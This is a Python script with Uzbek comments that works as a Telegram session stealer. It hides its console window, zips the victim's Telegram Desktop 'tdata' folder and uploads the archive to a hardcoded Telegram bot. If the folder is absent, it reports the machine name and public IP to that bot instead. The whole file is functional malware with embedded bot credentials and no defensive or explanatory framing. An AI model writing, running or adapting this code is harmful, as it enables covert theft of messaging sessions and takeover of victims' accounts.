import os
import shutil
import zipfile
import requests
import socket
import tempfile
import time

# Qora oynani yashirish
if os.name == 'nt':
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Ma'lumotlar (Token va ID)
BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
CHAT_ID = 7080045924

# --- Yordamchi funksiyalar ---
def send_telegram_message(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": text}
        requests.post(url, data=data)
    except:
        pass

def send_telegram_file(file_path, caption):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            requests.post(url, data={'chat_id': CHAT_ID, 'caption': caption}, files={'document': f})
    except:
        pass

def zip_folder(folder_path, output_path):
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, os.path.dirname(folder_path))
                try:
                    zipf.write(file_path, arcname)
                except:
                    pass

# --- Asosiy ish ---
def main():
    pc_name = socket.gethostname()
    appdata = os.getenv('APPDATA')
    tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')
    
    if os.path.exists(tdata_path):
        try:
            temp_dir = tempfile.gettempdir()
            zip_name = f"tdata_{pc_name}.zip"
            zip_path = os.path.join(temp_dir, zip_name)
            
            if os.path.exists(zip_path):
                os.remove(zip_path)
            
            send_telegram_message(f"⏳ Kompyuter: `{pc_name}` da tdata siqilmoqda...")
            zip_folder(tdata_path, zip_path)
            
            file_size_mb = os.path.getsize(zip_path) / (1024 * 1024)
            if file_size_mb < 49:
                send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 Kompyuter: `{pc_name}`\n📦 Hajmi: {file_size_mb:.2f} MB")
            else:
                send_telegram_message(f"⚠️ tdata juda katta ({file_size_mb:.2f} MB)")
            
            os.remove(zip_path)
        except Exception as e:
            send_telegram_message(f"❌ Xatolik: {str(e)}")
    else:
        try:
            ip = requests.get('https://api.ipify.org').text
            send_telegram_message(f"⚠️ tdata topilmadi!\n🖥 Nom: `{pc_name}`\n🌐 IP: {ip}")
        except:
            pass

if __name__ == "__main__":
    main()
